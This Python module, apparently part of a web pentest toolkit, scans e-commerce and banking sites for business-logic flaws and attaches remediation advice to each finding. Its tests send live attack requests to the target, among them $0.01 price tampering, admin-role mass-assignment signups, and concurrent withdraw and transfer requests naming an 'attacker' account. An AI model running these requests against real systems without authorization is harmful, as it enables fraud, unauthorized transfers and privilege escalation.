#!/usr/bin/env python3
"""
Advanced Business Logic Tester
--------------------------------
Tests for real-world business logic flaws found in e-commerce,
banking, and SaaS applications:

  • Negative quantity / price manipulation
  • Payment step bypass (checkout → success)
  • Coupon stacking / reuse abuse
  • Race condition on limited stock / coupons
  • Account enumeration via timing difference
  • Integer overflow in quantity/amount fields
  • Mass assignment / parameter pollution
  • Privilege escalation via role parameter tampering
  • Free trial abuse / plan downgrade bypass
  • Referral code self-referral fraud
"""

import time
import threading
import requests
from typing import List, Dict, Optional
from rich.console import Console

console = Console()


class BusinessLogicTester:
    """
    Advanced business logic vulnerability scanner.
    Tests real-world e-commerce, banking, and SaaS logic flows.
    """

    def __init__(self, target: str, session=None, timeout: int = 10):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.session = session or requests.Session()
        self.session.verify = False
        self.session.headers.setdefault(
            "User-Agent", "WebPwnToolkit/2.2 (Authorized Security Testing)"
        )
        self.results: List[Dict] = []

    # ── Helper ────────────────────────────────────────────────────────────────

    def _post(self, path: str, data: dict) -> Optional[requests.Response]:
        try:
            return self.session.post(
                self.target + path,
                data=data,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True,
            )
        except Exception:
            return None

    def _get(self, path: str, params: dict = None) -> Optional[requests.Response]:
        try:
            return self.session.get(
                self.target + path,
                params=params,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True,
            )
        except Exception:
            return None

    def _success(self, resp: Optional[requests.Response]) -> bool:
        if not resp:
            return False
        body = resp.text.lower()
        return resp.status_code in (200, 201, 302) and not any(
            s in body for s in ["error", "invalid", "denied", "refused", "fail"]
        )

    # ── Test 1: Negative Quantity ─────────────────────────────────────────────

    def _test_negative_quantity(self) -> List[Dict]:
        findings = []
        cart_paths = ["/cart", "/api/cart", "/shop/cart", "/basket", "/api/basket"]
        payloads = [
            {"quantity": -1, "product_id": 1},
            {"quantity": -999, "product_id": 1, "price": 100},
            {"qty": -1},
            {"amount": -50},
        ]
        for path in cart_paths:
            for data in payloads:
                resp = self._post(path, data)
                if self._success(resp):
                    body = resp.text.lower()
                    if any(s in body for s in ["cart", "total", "subtotal", "item"]):
                        findings.append(
                            {
                                "url": self.target + path,
                                "type": "Business Logic — Negative Quantity Accepted",
                                "severity": "high",
                                "cvss": 7.5,
                                "detail": (
                                    f"Negative quantity {data} accepted on {path}. "
                                    "Attacker can reduce cart total or earn store credit fraudulently."
                                ),
                                "evidence": resp.text[:200],
                                "owasp": "A04:2021 – Insecure Design",
                                "remediation": (
                                    "Server-side validation: quantity must be integer > 0. "
                                    "Never trust client-supplied prices or quantities."
                                ),
                            }
                        )
                        break
        return findings

    # ── Test 2: Price Parameter Tampering ────────────────────────────────────

    def _test_price_tampering(self) -> List[Dict]:
        findings = []
        order_paths = ["/checkout", "/order", "/api/order", "/api/checkout", "/buy"]
        for path in order_paths:
            tampered = {
                "price": 0.01,
                "total": 0.01,
                "amount": 0.01,
                "product_id": 1,
                "quantity": 1,
            }
            resp = self._post(path, tampered)
            if self._success(resp):
                body = resp.text.lower()
                if any(
                    s in body
                    for s in ["order", "success", "confirmed", "payment", "thank"]
                ):
                    findings.append(
                        {
                            "url": self.target + path,
                            "type": "Business Logic — Price Tampering Accepted",
                            "severity": "critical",
                            "cvss": 9.3,
                            "detail": (
                                f"Order submitted with price=$0.01 and was accepted on {path}. "
                                "Server trusts client-supplied price — full financial fraud possible."
                            ),
                            "evidence": resp.text[:300],
                            "owasp": "A04:2021 – Insecure Design",
                            "remediation": (
                                "NEVER accept client-supplied prices. "
                                "Always recalculate total server-side from product catalog. "
                                "Implement signed price tokens."
                            ),
                        }
                    )
        return findings

    # ── Test 3: Payment Step Bypass ───────────────────────────────────────────

    def _test_payment_bypass(self) -> List[Dict]:
        findings = []
        # Try going directly to success/completion page
        success_paths = [
            "/checkout/success",
            "/order/complete",
            "/payment/success",
            "/order/confirmation",
            "/checkout/complete",
            "/api/order/confirm",
        ]
        for path in success_paths:
            resp = self._get(path)
            if resp and resp.status_code == 200:
                body = resp.text.lower()
                if any(
                    s in body
                    for s in [
                        "thank you",
                        "order confirmed",
                        "order number",
                        "purchase complete",
                        "payment successful",
                    ]
                ):
                    findings.append(
                        {
                            "url": self.target + path,
                            "type": "Business Logic — Payment Step Bypass",
                            "severity": "critical",
                            "cvss": 9.8,
                            "detail": (
                                f"Order completion page '{path}' accessible without going through "
                                "payment flow. Attacker can mark orders as paid without paying."
                            ),
                            "evidence": resp.text[:300],
                            "owasp": "A04:2021 – Insecure Design",
                            "remediation": (
                                "Implement server-side order state machine. "
                                "Validate payment gateway callback signature. "
                                "Never allow direct access to completion URLs."
                            ),
                        }
                    )
        return findings

    # ── Test 4: Coupon Stacking / Reuse ───────────────────────────────────────

    def _test_coupon_abuse(self) -> List[Dict]:
        findings = []
        coupon_paths = ["/api/coupon", "/coupon/apply", "/discount/apply", "/promo"]
        test_codes = ["TEST100", "PROMO50", "SAVE100", "FREE", "ADMIN50", "DEV100"]

        for path in coupon_paths:
            for code in test_codes:
                resp = self._post(path, {"code": code, "cart_id": 1})
                if self._success(resp):
                    body = resp.text.lower()
                    if any(
                        s in body
                        for s in ["discount", "applied", "saved", "off", "percent"]
                    ):
                        # Try applying same coupon again
                        resp2 = self._post(path, {"code": code, "cart_id": 1})
                        if self._success(resp2):
                            findings.append(
                                {
                                    "url": self.target + path,
                                    "type": "Business Logic — Coupon Reuse/Stacking",
                                    "severity": "high",
                                    "cvss": 6.5,
                                    "detail": (
                                        f"Coupon code '{code}' applied multiple times. "
                                        "No server-side single-use enforcement detected."
                                    ),
                                    "evidence": f"Code '{code}' accepted twice on {path}",
                                    "owasp": "A04:2021 – Insecure Design",
                                    "remediation": (
                                        "Mark coupons as used after first application. "
                                        "Bind coupon to user account server-side. "
                                        "Implement idempotency keys on discount endpoints."
                                    ),
                                }
                            )
                            break
        return findings

    # ── Test 5: Race Condition ────────────────────────────────────────────────

    def _test_race_condition(self) -> List[Dict]:
        """Test race condition on limited stock / coupon / transfer endpoints."""
        findings = []
        race_paths = [
            ("/api/coupon/apply", {"code": "LIMITEDSALE", "cart_id": 1}),
            ("/api/withdraw", {"amount": 100, "account": "test"}),
            ("/api/transfer", {"amount": 100, "to": "attacker"}),
            ("/api/redeem", {"points": 100}),
        ]

        for path, data in race_paths:
            results = []
            lock = threading.Lock()

            def send():
                resp = self._post(path, data)
                if resp:
                    with lock:
                        results.append(resp.status_code)

            threads = [threading.Thread(target=send) for _ in range(15)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()

            success_count = results.count(200) + results.count(201)
            if success_count > 2:
                findings.append(
                    {
                        "url": self.target + path,
                        "type": "Business Logic — Race Condition (Double Spend / Duplicate Redemption)",
                        "severity": "high",
                        "cvss": 8.1,
                        "detail": (
                            f"{success_count}/15 concurrent requests to {path} succeeded. "
                            "Race condition may allow double-spending, duplicate coupon use, "
                            "or balance manipulation."
                        ),
                        "evidence": f"HTTP 200/201 responses: {success_count}/15 concurrent requests",
                        "owasp": "A04:2021 – Insecure Design",
                        "remediation": (
                            "Use database-level locking (SELECT FOR UPDATE). "
                            "Implement idempotency keys. "
                            "Use optimistic concurrency with version fields."
                        ),
                    }
                )
        return findings

    # ── Test 6: Account Enumeration via Timing ────────────────────────────────

    def _test_timing_enumeration(self) -> List[Dict]:
        login_paths = ["/login", "/api/login", "/auth/login", "/signin"]
        timings = {"valid": [], "invalid": []}

        # Known valid-like vs clearly invalid usernames
        for _ in range(3):
            for path in login_paths:
                try:
                    t0 = time.time()
                    self._post(
                        path, {"username": "admin", "password": "wrong_password_xyz"}
                    )
                    timings["valid"].append(time.time() - t0)

                    t0 = time.time()
                    self._post(
                        path,
                        {"username": "nonexistentuser_xyz_12345", "password": "wrong"},
                    )
                    timings["invalid"].append(time.time() - t0)
                except Exception:
                    pass

        if timings["valid"] and timings["invalid"]:
            avg_valid = sum(timings["valid"]) / len(timings["valid"])
            avg_invalid = sum(timings["invalid"]) / len(timings["invalid"])
            diff = abs(avg_valid - avg_invalid)

            if diff > 0.15:  # 150ms+ difference is suspicious
                return [
                    {
                        "url": self.target + "/login",
                        "type": "Business Logic — Account Enumeration via Timing",
                        "severity": "medium",
                        "cvss": 5.3,
                        "detail": (
                            f"Response time differs {diff*1000:.0f}ms between valid and invalid usernames. "
                            "Timing side-channel allows attacker to enumerate valid accounts."
                        ),
                        "evidence": (
                            f"Avg time (existing user): {avg_valid*1000:.0f}ms | "
                            f"Avg time (non-existing): {avg_invalid*1000:.0f}ms"
                        ),
                        "owasp": "A07:2021 – Identification and Authentication Failures",
                        "remediation": (
                            "Use constant-time comparison for auth checks. "
                            "Return identical error messages for invalid user vs wrong password. "
                            "Add consistent artificial delay to login responses."
                        ),
                    }
                ]
        return []

    # ── Test 7: Mass Assignment ───────────────────────────────────────────────

    def _test_mass_assignment(self) -> List[Dict]:
        findings = []
        register_paths = [
            "/api/register",
            "/api/signup",
            "/api/user",
            "/register",
            "/signup",
        ]
        privileged_data = [
            {
                "username": "testuser",
                "email": "test@test.com",
                "password": "Test123!",
                "role": "admin",
                "is_admin": True,
            },
            {
                "username": "testuser2",
                "email": "test2@test.com",
                "password": "Test123!",
                "admin": True,
                "is_superuser": True,
            },
            {
                "username": "testuser3",
                "email": "test3@test.com",
                "password": "Test123!",
                "plan": "enterprise",
                "subscription": "unlimited",
            },
        ]
        for path in register_paths:
            for data in privileged_data:
                resp = self._post(path, data)
                if self._success(resp):
                    body = resp.text.lower()
                    if "admin" in body or "role" in body or "enterprise" in body:
                        findings.append(
                            {
                                "url": self.target + path,
                                "type": "Business Logic — Mass Assignment / Privilege Escalation",
                                "severity": "critical",
                                "cvss": 9.8,
                                "detail": (
                                    f"Registration endpoint {path} accepted privileged fields "
                                    f"(role, is_admin, plan). Server reflects elevated privileges in response."
                                ),
                                "evidence": resp.text[:300],
                                "owasp": "A04:2021 – Insecure Design",
                                "remediation": (
                                    "Whitelist only expected fields on registration. "
                                    "Use DTO/schema validation. "
                                    "Never auto-bind request parameters to model fields."
                                ),
                            }
                        )
        return findings

    # ── Test 8: Integer Overflow ──────────────────────────────────────────────

    def _test_integer_overflow(self) -> List[Dict]:
        findings = []
        overflow_paths = ["/cart", "/api/cart", "/transfer", "/api/transfer"]
        overflow_values = [
            2**31 - 1,  # Max signed 32-bit
            2**31,  # Overflow
            2**63 - 1,  # Max signed 64-bit
            -(2**31),  # Min signed 32-bit (negative balance)
            9999999999,  # Very large amount
        ]
        for path in overflow_paths:
            for val in overflow_values:
                resp = self._post(
                    path, {"quantity": val, "amount": val, "product_id": 1}
                )
                if resp and resp.status_code == 200:
                    body = resp.text.lower()
                    if any(s in body for s in ["success", "added", "cart", "total"]):
                        findings.append(
                            {
                                "url": self.target + path,
                                "type": "Business Logic — Integer Overflow Accepted",
                                "severity": "high",
                                "cvss": 7.5,
                                "detail": (
                                    f"Extreme value {val} accepted on {path}. "
                                    "Integer overflow may cause negative totals or free items."
                                ),
                                "evidence": f"Value {val} returned HTTP {resp.status_code}",
                                "owasp": "A04:2021 – Insecure Design",
                                "remediation": (
                                    "Validate all numeric inputs have reasonable min/max bounds. "
                                    "Use safe integer types. Reject values outside business rules."
                                ),
                            }
                        )
                        break
        return findings

    # ── Public run ────────────────────────────────────────────────────────────

    def run(self) -> List[Dict]:
        console.print(
            f"\n  [bold yellow]▶ Advanced Business Logic Testing on {self.target}[/bold yellow]"
        )

        tests = [
            ("Negative Quantity", self._test_negative_quantity),
            ("Price Tampering", self._test_price_tampering),
            ("Payment Bypass", self._test_payment_bypass),
            ("Coupon Abuse", self._test_coupon_abuse),
            ("Race Condition", self._test_race_condition),
            ("Timing Enumeration", self._test_timing_enumeration),
            ("Mass Assignment", self._test_mass_assignment),
            ("Integer Overflow", self._test_integer_overflow),
        ]

        for name, func in tests:
            console.print(f"  [dim cyan][Logic] Testing: {name}...[/dim cyan]")
            try:
                findings = func()
                for f in findings:
                    self.results.append(f)
                    console.print(f"  [bold red][!] {f['type']}[/bold red]")
            except Exception as e:
                console.print(f"  [dim]Test '{name}' error: {e}[/dim]")

        color = "red" if self.results else "green"
        msg = (
            f"{len(self.results)} business logic flaw(s) found!"
            if self.results
            else "No business logic flaws detected"
        )
        console.print(f"  [{color}]{msg}[/]")
        return self.results
